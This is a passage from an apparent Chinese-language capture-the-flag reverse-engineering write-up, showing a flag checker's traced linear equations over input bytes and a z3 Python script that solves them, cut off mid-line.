class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line">1020</span><br><span class="line">Sorry, wrong flag!</span><br><span class="line">0 -&gt;0</span><br><span class="line">1 -&gt;0</span><br><span class="line">2 -&gt;1070</span><br><span class="line">3 -&gt;16</span><br><span class="line">4 -&gt;208</span><br><span class="line">5 -&gt;16776140</span><br><span class="line">6 -&gt;15</span><br><span class="line">7 -&gt;0</span><br><span class="line">8 -&gt;1023</span><br><span class="line">9 -&gt;16</span><br><span class="line">10 -&gt;-1</span><br><span class="line">11 -&gt;1</span><br><span class="line">12 -&gt;16</span><br><span class="line">13 -&gt;1040</span><br><span class="line">14 -&gt;16777216</span><br><span class="line">15 -&gt;-16777216</span><br><span class="line">16 -&gt;16774200</span><br><span class="line">17 -&gt;1411</span><br><span class="line">18 -&gt;16776275</span><br><span class="line">19 -&gt;3646</span><br><span class="line">20 -&gt;1532</span><br><span class="line">21 -&gt;6451</span><br><span class="line">22 -&gt;2510</span><br><span class="line">23 -&gt;16777141</span><br><span class="line">24 -&gt;3*x10 - 4*x11 + 4*x12 - 13*x13 - 2*x14 - 7*x15 - 7*x8 - 2*x9 + 16777216</span><br><span class="line">25 -&gt;2*x10 + 5*x11 + 6*x12 - 10*x13 + 11*x14 - 3*x15 - 2*x8 + 3*x9</span><br><span class="line">26 -&gt;-3*x10 - 3*x11 + 4*x12 - 5*x13 - 2*x14 + 6*x15 - 2*x8 - 4*x9 + 16777216</span><br><span class="line">27 -&gt;-3*x10 + 5*x11 - 6*x12 + 17*x13 + 2*x14 + 7*x15 + 9*x8 + 3*x9</span><br><span class="line">28 -&gt;-x10 + 3*x11 + 6*x12 - 8*x13 + 9*x14 + 4*x15 - 2*x8 + 2*x9</span><br><span class="line">29 -&gt;-2*x10 + 13*x11 + 5*x12 + x13 + 20*x14 + 8*x15 + 6*x8 + 7*x9</span><br><span class="line">30 -&gt;-6*x10 + x11 - 8*x12 + 22*x13 - 6*x14 + 13*x15 + 9*x8 - x9</span><br><span class="line">31 -&gt;-8*x10 - 6*x11 - 5*x12 + 15*x13 - 11*x14 + 15*x15 + 5*x8 - 5*x9</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">32 -&gt;-7*x16 - 2*x17 + 3*x18 - 4*x19 + 4*x20 - 13*x21 - 2*x22 - 7*x23 + 16777216</span><br><span class="line">33 -&gt;-2*x16 + 3*x17 + 2*x18 + 5*x19 + 6*x20 - 10*x21 + 11*x22 - 3*x23</span><br><span class="line">34 -&gt;-2*x16 - 4*x17 - 3*x18 - 3*x19 + 4*x20 - 5*x21 - 2*x22 + 6*x23</span><br><span class="line">35 -&gt;9*x16 + 3*x17 - 3*x18 + 5*x19 - 6*x20 + 17*x21 + 2*x22 + 7*x23</span><br><span class="line">36 -&gt;-2*x16 + 2*x17 - x18 + 3*x19 + 6*x20 - 8*x21 + 9*x22 + 4*x23</span><br><span class="line">37 -&gt;6*x16 + 7*x17 - 2*x18 + 13*x19 + 5*x20 + x21 + 20*x22 + 8*x23</span><br><span class="line">38 -&gt;9*x16 - x17 - 6*x18 + x19 - 8*x20 + 22*x21 - 6*x22 + 13*x23</span><br><span class="line">39 -&gt;5*x16 - 5*x17 - 8*x18 - 6*x19 - 5*x20 + 15*x21 - 11*x22 + 15*x23</span><br><span class="line"></span><br><span class="line">40 -&gt;-7*x24 - 2*x25 + 3*x26 - 4*x27 + 4*x28 - 13*x29 - 2*x30 - 7*x31 + 16777216</span><br><span class="line">41 -&gt;-2*x24 + 3*x25 + 2*x26 + 5*x27 + 6*x28 - 10*x29 + 11*x30 - 3*x31</span><br><span class="line">42 -&gt;-2*x24 - 4*x25 - 3*x26 - 3*x27 + 4*x28 - 5*x29 - 2*x30 + 6*x31</span><br><span class="line">43 -&gt;9*x24 + 3*x25 - 3*x26 + 5*x27 - 6*x28 + 17*x29 + 2*x30 + 7*x31</span><br><span class="line">44 -&gt;-2*x24 + 2*x25 - x26 + 3*x27 + 6*x28 - 8*x29 + 9*x30 + 4*x31</span><br><span class="line">45 -&gt;6*x24 + 7*x25 - 2*x26 + 13*x27 + 5*x28 + x29 + 20*x30 + 8*x31</span><br><span class="line">46 -&gt;9*x24 - x25 - 6*x26 + x27 - 8*x28 + 22*x29 - 6*x30 + 13*x31</span><br><span class="line">47 -&gt;5*x24 - 5*x25 - 8*x26 - 6*x27 - 5*x28 + 15*x29 - 11*x30 + 15*x31</span><br><span class="line"></span><br><span class="line">48 -&gt;-7*x32 - 2*x33 + 3*x34 - 4*x35 + 4*x36 - 13*x37 - 2*x38 - 7*x39 + 16777216</span><br><span class="line">49 -&gt;-2*x32 + 3*x33 + 2*x34 + 5*x35 + 6*x36 - 10*x37 + 11*x38 - 3*x39</span><br><span class="line">50 -&gt;-2*x32 - 4*x33 - 3*x34 - 3*x35 + 4*x36 - 5*x37 - 2*x38 + 6*x39</span><br><span class="line">51 -&gt;9*x32 + 3*x33 - 3*x34 + 5*x35 - 6*x36 + 17*x37 + 2*x38 + 7*x39</span><br><span class="line">52 -&gt;-2*x32 + 2*x33 - x34 + 3*x35 + 6*x36 - 8*x37 + 9*x38 + 4*x39</span><br><span class="line">53 -&gt;6*x32 + 7*x33 - 2*x34 + 13*x35 + 5*x36 + x37 + 20*x38 + 8*x39</span><br><span class="line">54 -&gt;9*x32 - x33 - 6*x34 + x35 - 8*x36 + 22*x37 - 6*x38 + 13*x39</span><br><span class="line">55 -&gt;5*x32 - 5*x33 - 8*x34 - 6*x35 - 5*x36 + 15*x37 - 11*x38 + 15*x39</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">56 -&gt;-7*x40 - 2*x41 + 3*x42 - 4*x43 + 4*x44 - 13*x45 - 2*x46 - 7*x47 + 16777216</span><br><span class="line">57 -&gt;-2*x40 + 3*x41 + 2*x42 + 5*x43 + 6*x44 - 10*x45 + 11*x46 - 3*x47</span><br><span class="line">58 -&gt;-2*x40 - 4*x41 - 3*x42 - 3*x43 + 4*x44 - 5*x45 - 2*x46 + 6*x47</span><br><span class="line">59 -&gt;9*x40 + 3*x41 - 3*x42 + 5*x43 - 6*x44 + 17*x45 + 2*x46 + 7*x47</span><br><span class="line">60 -&gt;-2*x40 + 2*x41 - x42 + 3*x43 + 6*x44 - 8*x45 + 9*x46 + 4*x47</span><br><span class="line">61 -&gt;6*x40 + 7*x41 - 2*x42 + 13*x43 + 5*x44 + x45 + 20*x46 + 8*x47</span><br><span class="line">62 -&gt;9*x40 - x41 - 6*x42 + x43 - 8*x44 + 22*x45 - 6*x46 + 13*x47</span><br><span class="line">63 -&gt;5*x40 - 5*x41 - 8*x42 - 6*x43 - 5*x44 + 15*x45 - 11*x46 + 15*x47</span><br><span class="line"></span><br><span class="line">64 -&gt;-7*x48 - 2*x49 + 3*x50 - 4*x51 + 4*x52 - 13*x53 - 2*x54 - 7*x55 + 16777216</span><br><span class="line">65 -&gt;-2*x48 + 3*x49 + 2*x50 + 5*x51 + 6*x52 - 10*x53 + 11*x54 - 3*x55</span><br><span class="line">66 -&gt;-2*x48 - 4*x49 - 3*x50 - 3*x51 + 4*x52 - 5*x53 - 2*x54 + 6*x55</span><br><span class="line">67 -&gt;9*x48 + 3*x49 - 3*x50 + 5*x51 - 6*x52 + 17*x53 + 2*x54 + 7*x55</span><br><span class="line">68 -&gt;-2*x48 + 2*x49 - x50 + 3*x51 + 6*x52 - 8*x53 + 9*x54 + 4*x55</span><br><span class="line">69 -&gt;6*x48 + 7*x49 - 2*x50 + 13*x51 + 5*x52 + x53 + 20*x54 + 8*x55</span><br><span class="line">70 -&gt;9*x48 - x49 - 6*x50 + x51 - 8*x52 + 22*x53 - 6*x54 + 13*x55</span><br><span class="line">71 -&gt;5*x48 - 5*x49 - 8*x50 - 6*x51 - 5*x52 + 15*x53 - 11*x54 + 15*x55</span><br><span class="line">72 -&gt;-7*x56 - 2*x57 + 3*x58 - 4*x59 + 4*x60 - 13*x61 - 2*x62 - 7*x63 + 16777216</span><br><span class="line">73 -&gt;-2*x56 + 3*x57 + 2*x58 + 5*x59 + 6*x60 - 10*x61 + 11*x62 - 3*x63</span><br><span class="line">74 -&gt;-2*x56 - 4*x57 - 3*x58 - 3*x59 + 4*x60 - 5*x61 - 2*x62 + 6*x63</span><br><span class="line">75 -&gt;9*x56 + 3*x57 - 3*x58 + 5*x59 - 6*x60 + 17*x61 + 2*x62 + 7*x63</span><br><span class="line">76 -&gt;-2*x56 + 2*x57 - x58 + 3*x59 + 6*x60 - 8*x61 + 9*x62 + 4*x63</span><br><span class="line">77 -&gt;6*x56 + 7*x57 - 2*x58 + 13*x59 + 5*x60 + x61 + 20*x62 + 8*x63</span><br><span class="line">78 -&gt;9*x56 - x57 - 6*x58 + x59 - 8*x60 + 22*x61 - 6*x62 + 13*x63</span><br><span class="line">79 -&gt;5*x56 - 5*x57 - 8*x58 - 6*x59 - 5*x60 + 15*x61 - 11*x62 + 15*x63</span><br><span class="line">80 -&gt;0</span><br><span class="line">81 -&gt;-7*x56 - 2*x57 + 3*x58 - 4*x59 + 4*x60 - 13*x61 - 2*x62 - 7*x63 + 16777216</span><br><span class="line">82 -&gt;-2*x56 + 3*x57 + 2*x58 + 5*x59 + 6*x60 - 10*x61 + 11*x62 - 3*x63</span><br><span class="line">83 -&gt;-2*x56 - 4*x57 - 3*x58 - 3*x59 + 4*x60 - 5*x61 - 2*x62 + 6*x63</span><br><span class="line">84 -&gt;9*x56 + 3*x57 - 3*x58 + 5*x59 - 6*x60 + 17*x61 + 2*x62 + 7*x63</span><br><span class="line">85 -&gt;-2*x56 + 2*x57 - x58 + 3*x59 + 6*x60 - 8*x61 + 9*x62 + 4*x63</span><br><span class="line">86 -&gt;6*x56 + 7*x57 - 2*x58 + 13*x59 + 5*x60 + x61 + 20*x62 + 8*x63</span><br><span class="line">87 -&gt;9*x56 - x57 - 6*x58 + x59 - 8*x60 + 22*x61 - 6*x62 + 13*x63</span><br><span class="line">88 -&gt;5*x56 - 5*x57 - 8*x58 - 6*x59 - 5*x60 + 15*x61 - 11*x62 + 15*x63</span><br><span class="line">89 -&gt;0</span><br><span class="line">90 -&gt;0</span><br><span class="line">91 -&gt;0</span><br><span class="line">92 -&gt;0</span><br><span class="line">93 -&gt;0</span><br><span class="line">94 -&gt;0</span><br><span class="line">95 -&gt;0</span><br><span class="line">96 -&gt;0</span><br><span class="line">97 -&gt;0</span><br><span class="line"></span><br><span class="line">0-7</span><br><span class="line">98 -&gt;16774200</span><br><span class="line">99 -&gt;1411</span><br><span class="line">100 -&gt;16776275</span><br><span class="line">101 -&gt;3646</span><br><span class="line">102 -&gt;1532</span><br><span class="line">103 -&gt;6451</span><br><span class="line">104 -&gt;2510</span><br><span class="line">105 -&gt;16777141</span><br><span class="line"></span><br><span class="line">8-15</span><br><span class="line">106 -&gt;16775256</span><br><span class="line">107 -&gt;2061</span><br><span class="line">108 -&gt;16776706</span><br><span class="line">109 -&gt;2260</span><br><span class="line">110 -&gt;2107</span><br><span class="line">111 -&gt;6124</span><br><span class="line">112 -&gt;878</span><br><span class="line">113 -&gt;16776140</span><br><span class="line"></span><br><span class="line">16-23</span><br><span class="line">114 -&gt;16775299</span><br><span class="line">115 -&gt;1374</span><br><span class="line">116 -&gt;16776956</span><br><span class="line">117 -&gt;2212</span><br><span class="line">118 -&gt;1577</span><br><span class="line">119 -&gt;4993</span><br><span class="line">120 -&gt;1351</span><br><span class="line">121 -&gt;16777040</span><br><span class="line"></span><br><span class="line">24-31</span><br><span class="line">122 -&gt;16774665</span><br><span class="line">123 -&gt;1498</span><br><span class="line">124 -&gt;16776379</span><br><span class="line">125 -&gt;3062</span><br><span class="line">126 -&gt;1593</span><br><span class="line">127 -&gt;5966</span><br><span class="line">128 -&gt;1924</span><br><span class="line">129 -&gt;16776815</span><br><span class="line"></span><br><span class="line">32-39</span><br><span class="line">130 -&gt;16774318</span><br><span class="line">131 -&gt;851</span><br><span class="line">132 -&gt;16775763</span><br><span class="line">133 -&gt;3663</span><br><span class="line">134 -&gt;711</span><br><span class="line">135 -&gt;5193</span><br><span class="line">136 -&gt;2591</span><br><span class="line">137 -&gt;16777069</span><br><span class="line"></span><br><span class="line">40-47</span><br><span class="line">138 -&gt;16774005</span><br><span class="line">139 -&gt;1189</span><br><span class="line">140 -&gt;16776283</span><br><span class="line">141 -&gt;3892</span><br><span class="line">142 -&gt;1372</span><br><span class="line">143 -&gt;6362</span><br><span class="line">144 -&gt;2910</span><br><span class="line">145 -&gt;307</span><br><span class="line"></span><br><span class="line">48-55</span><br><span class="line">146 -&gt;16775169</span><br><span class="line">147 -&gt;1031</span><br><span class="line">148 -&gt;16776798</span><br><span class="line">149 -&gt;2426</span><br><span class="line">150 -&gt;1171</span><br><span class="line">151 -&gt;4570</span><br><span class="line">152 -&gt;1728</span><br><span class="line">153 -&gt;33</span><br><span class="line"></span><br><span class="line">56-63</span><br><span class="line">154 -&gt;16775201</span><br><span class="line">155 -&gt;819</span><br><span class="line">156 -&gt;16776898</span><br><span class="line">157 -&gt;2370</span><br><span class="line">158 -&gt;1132</span><br><span class="line">159 -&gt;4255</span><br><span class="line">160 -&gt;1900</span><br><span class="line">161 -&gt;347</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>所以z3直接解就行了</p><p>需要注意的是有些方程组左边和右边明显差距很大的，需要加一个16777216(找规律)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">x0 = Int(<span class="string">&#x27;x0&#x27;</span>)</span><br><span class="line">x1 = Int(<span class="string">&#x27;x1&#x27;</span>)</span><br><span class="line">x2 = Int(<span class="string">&#x27;x2&#x27;</span>)</span><br><span class="line">x3 = Int(<span class="string">&#x27;x3&#x27;</span>)</span><br><span class="line">x4 = Int(<span class="string">&#x27;x4&#x27;</span>)</span><br><span class="line">x5 = Int(<span class="string">&#x27;x5&#x27;</span>)</span><br><span class="line">x6 = Int(<span class="string">&#x27;x6&#x27;</span>)</span><br><span class="line">x7 = Int(<span class="string">&#x27;x7&#x27;</span>)</span><br><span class="line">x8 = Int(<span class="string">&#x27;x8&#x27;</span>)</span><br><span class="line">x9 = Int(<span class="string">&#x27;x9&#x27;</span>)</span><br><span class="line">x10 = Int(<span class="string">&#x27;x10&#x27;</span>)</span><br><span class="line">x11 = Int(<span class="string">&#x27;x11&#x27;</span>)</span><br><span class="line">x12 = Int(<span class="string">&#x27;x12&#x27;</span>)</span><br><span class="line">x13 = Int(<span class="string">&#x27;x13&#x27;</span>)</span><br><span class="line">x14 = Int(<span class="string">&#x27;x14&#x27;</span>)</span><br><span class="line">x15 = Int(<span class="string">&#x27;x15&#x27;</span>)</span><br><span class="line">x16 = Int(<span class="string">&#x27;x16&#x27;</span>)</span><br><span class="line">x17 = Int(<span class="string">&#x27;x17&#x27;</span>)</span><br><span class="line">x18 = Int(<span class="string">&#x27;x18&#x27;</span>)</span><br><span class="line">x19 = Int(<span class="string">&#x27;x19&#x27;</span>)</span><br><span class="line">x20 = Int(<span class="string">&#x27;x20&#x27;</span>)</span><br><span class="line">x21 = Int(<span class="string">&#x27;x21&#x27;</span>)</span><br><span class="line">x22 = Int(<span class="string">&#x27;x22&#x27;</span>)</span><br><span class="line">x23 = Int(<span class="string">&#x27;x23&#x27;</span>)</span><br><span class="line">x24 = Int(<span class="string">&#x27;x24&#x27;</span>)</span><br><span class="line">x25 = Int(<span class="string">&#x27;x25&#x27;</span>)</span><br><span class="line">x26 = Int(<span class="string">&#x27;x26&#x27;</span>)</span><br><span class="line">x27 = Int(<span class="string">&#x27;x27&#x27;</span>)</span><br><span class="line">x28 = Int(<span class="string">&#x27;x28&#x27;</span>)</span><br><span class="line">x29 = Int(<span class="string">&#x27;x29&#x27;</span>)</span><br><span class="line">x30 = Int(<span class="string">&#x27;x30&#x27;</span>)</span><br><span class="line">x31 = Int(<span class="string">&#x27;x31&#x27;</span>)</span><br><span class="line">x32 = Int(<span class="string">&#x27;x32&#x27;</span>)</span><br><span class="line">x33 = Int(<span class="string">&#x27;x33&#x27;</span>)</span><br><span class="line">x34 = Int(<span class="string">&#x27;x34&#x27;</span>)</span><br><span class="line">x35 = Int(<span class="string">&#x27;x35&#x27;</span>)</span><br><span class="line">x36 = Int(<span class="string">&#x27;x36&#x27;</span>)</span><br><span class="line">x37 = Int(<span class="string">&#x27;x37&#x27;</span>)</span><br><span class="line">x38 = Int(<span class="string">&#x27;x38&#x27;</span>)</span><br><span class="line">x39 = Int(<span class="string">&#x27;x39&#x27;</span>)</span><br><span class="line">x40 = Int(<span class="string">&#x27;x40&#x27;</span>)</span><br><span class="line">x41 = Int(<span class="string">&#x27;x41&#x27;</span>)</span><br><span class="line">x42 = Int(<span class="string">&#x27;x42&#x27;</span>)</span><br><span class="line">x43 = Int(<span class="string">&#x27;x43&#x27;</span>)</span><br><span class="line">x44 = Int(<span class="string">&#x27;x44&#x27;</span>)</span><br><span class="line">x45 = Int(<span class="string">&#x27;x45&#x27;</span>)</span><br><span class="line">x46 = Int(<span class="string">&#x27;x46&#x27;</span>)</span><br><span class="line">x47 = Int(<span class="string">&#x27;x47&#x27;</span>)</span><br><span class="line">x48 = Int(<span class="string">&#x27;x48&#x27;</span>)</span><br><span class="line">x49 = Int(<span class="string">&#x27;x49&#x27;</span>)</span><br><span class="line">x50 = Int(<span class="string">&#x27;x50&#x27;</span>)</span><br><span class="line">x51 = Int(<span class="string">&#x27;x51&#x27;</span>)</span><br><span class="line">x52 = Int(<span class="string">&#x27;x52&#x27;</span>)</span><br><span class="line">x53 = Int(<span class="string">&#x27;x53&#x27;</span>)</span><br><span class="line">x54 = Int(<span class="string">&#x27;x54&#x27;</span>)</span><br><span class="line">x55 = Int(<span class="string">&#x27;x55&#x27;</span>)</span><br><span class="line">x56 = Int(<span class="string">&#x27;x56&#x27;</span>)</span><br><span class="line">x57 = Int(<span class="string">&#x27;x57&#x27;</span>)</span><br><span class="line">x58 = Int(<span class="string">&#x27;x58&#x27;</span>)</span><br><span class="line">x59 = Int(<span class="string">&#x27;x59&#x27;</span>)</span><br><span class="line">x60 = Int(<span class="string">&#x27;x60&#x27;</span>)</span><br><span class="line">x61 = Int(<span class="string">&#x27;x61&#x27;</span>)</span><br><span class="line">x62 = Int(<span class="string">&#x27;x62&#x27;</span>)</span><br><span class="line">x63 = Int(<span class="string">&#x27;x63&#x27;</span>)</span><br><span class="line"></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line"><span class="comment"># solver.add(x16 &gt;=33)</span></span><br><span class="line"><span class="comment"># solver.add(x16 &lt;=125)</span></span><br><span class="line"><span class="comment"># solver.add(x17 &gt;=33)</span></span><br><span class="line"><span class="comment"># solver.add(x17 &lt;=125)</span></span><br><span class="line"><span class="comment"># solver.add(x18 &gt;=33)</span></span><br><span class="line"><span class="comment"># solver.add(x18 &lt;=125)</span></span><br><span class="line"><span class="comment"># solver.add(x19 &gt;=33)</span></span><br><span class="line"><span class="comment"># solver.add(x19 &lt;=125)</span></span><br><span class="line"><span class="comment"># solver.add(x20 &gt;=33)</span></span><br><span class="line"><span class="comment"># solver.add(x20 &lt;=125)</span></span><br><span class="line"><span class="comment"># solver.add(x21 &gt;=33)</span></span><br><span class="line"><span class="comment"># solver.add(x21 &lt;=125)</span></span><br><span class="line"><span class="comment"># solver.add(x22 &gt;=33)</span></span><br><span class="line"><span class="comment"># solver.add(x22 &lt;=125)</span></span><br><span class="line"><span class="comment"># solver.add(x23 &gt;=33)</span></span><br><span class="line"><span class="comment"># solver.add(x23 &lt;=125)</span></span><br><span class="line"><span class="comment"># solver.add(x8 &gt;=32)</span></span><br><span class="line"><span class="comment"># solver.add(x8 &lt;=126)</span></span><br><span class="line"><span class="comment"># solver.add(x9 &gt;=32)</span></span><br><span class="line"><span class="comment"># solver.add(x9 &lt;=126)</span></span><br><span class="line"><span class="comment"># solver.add(x10 &gt;=32)</span></span><br><span class="line"><span class="comment"># solver.add(x10 &lt;=126)</span></span><br><span class="line"><span class="comment"># solver.add(x11 &gt;=32)</span></span><br><span class="line"><span class="comment"># solver.add(x11 &lt;=126)</span></span><br><span class="line"><span class="comment"># solver.add(x12 &gt;=32)</span></span><br><span class="line"><span class="comment"># solver.add(x12 &lt;=126)</span></span><br><span class="line"><span class="comment"># solver.add(x13 &gt;=32)</span></span><br><span class="line"><span class="comment"># solver.add(x13 &lt;=126)</span></span><br><span class="line"><span class="comment"># solver.add(x14 &gt;=32)</span></span><br><span class="line"><span class="comment"># solver.add(x14 &lt;=126)</span></span><br><span class="line"><span class="comment"># solver.add(x15 &gt;=32)</span></span><br><span class="line"><span class="comment"># solver.add(x15 &lt;=126)</span></span><br><span class="line"><span class="comment"># solver.add(2*x10 + 5*x11 + 6*x12 - 10*x13 + 11*x14 - 3*x15 - 2*x8 + 3*x9 - 2061==0)</span></span><br><span class="line"><span class="comment"># solver.add(-3*x10 - 3*x11 + 4*x12 - 5*x13 - 2*x14 + 6*x15 - 2*x8 - 4*x9 + 510==0)</span></span><br><span class="line"><span class="comment"># solver.add(3*x10 - 5*x11 + 6*x12 - 17*x13 - 2*x14 - 7*x15 - 9*x8 - 3*x9 + 2260==0)</span></span><br><span class="line"><span class="comment"># solver.add(-x10 + 3*x11 + 6*x12 - 8*x13 + 9*x14 + 4*x15 - 2*x8 + 2*x9 - 2107 ==0)</span></span><br><span class="line"><span class="comment"># solver.add(2*x10 - 13*x11 - 5*x12 - x13 - 20*x14 - 8*x15 - 6*x8 - 7*x9 + 6124==0)</span></span><br><span class="line"><span class="comment"># solver.add(-6*x10 + x11 - 8*x12 + 22*x13 - 6*x14 + 13*x15 + 9*x8 - x9 - 878 ==0)</span></span><br><span class="line"><span class="comment"># solver.add(3*x10 - 4*x11 + 4*x12 - 13*x13 - 2*x14 - 7*x15 - 7*x8 - 2*x9 + 1960==0)</span></span><br><span class="line"><span class="comment"># solver.add(-7*x16 - 2*x17 + 3*x18 - 4*x19 + 4*x20 - 13*x21 - 2*x22 - 7*x23 + 16777216==16775299)</span></span><br><span class="line"><span class="comment"># solver.add(-2*x16 + 3*x17 + 2*x18 + 5*x19 + 6*x20 - 10*x21 + 11*x22 - 3*x23==1374)</span></span><br><span class="line"><span class="comment"># solver.add(-2*x16 - 4*x17 - 3*x18 - 3*x19 + 4*x20 - 5*x21 - 2*x22 + 6*x23+16777216==16776956)</span></span><br><span class="line"><span class="comment"># solver.add(9*x16 + 3*x17 - 3*x18 + 5*x19 - 6*x20 + 17*x21 + 2*x22 + 7*x23==2212)</span></span><br><span class="line"><span class="comment"># solver.add(-2*x16 + 2*x17 - x18 + 3*x19 + 6*x20 - 8*x21 + 9*x22 + 4*x23==1577)</span></span><br><span class="line"><span class="comment"># solver.add(6*x16 + 7*x17 - 2*x18 + 13*x19 + 5*x20 + x21 + 20*x22 + 8*x23==4993)</span></span><br><span class="line"><span class="comment"># solver.add(9*x16 - x17 - 6*x18 + x19 - 8*x20 + 22*x21 - 6*x22 + 13*x23==1351)</span></span><br><span class="line"><span class="comment"># solver.add(5*x16 - 5*x17 - 8*x18 - 6*x19 - 5*x20 + 15*x21 - 11*x22 + 15*x23+16777216==16777040)</span></span><br><span class="line"><span class="comment"># solver.add(2*x16 + 4*x17 + 3*x18 + 3*x19 - 4*x20 + 5*x21 + 2*x22 - 6*x23 -260==0)</span></span><br><span class="line">solver.add(<span class="number">-7</span>*x24 - <span class="number">2</span>*x25 + <span class="number">3</span>*x26 - <span class="number">4</span>*x27 + <span class="number">4</span>*x28 - <span class="number">13</span>*x29 - <span class="number">2</span>*x30 - <span class="number">7</span>*x31 + <span class="number">16777216</span>==<span 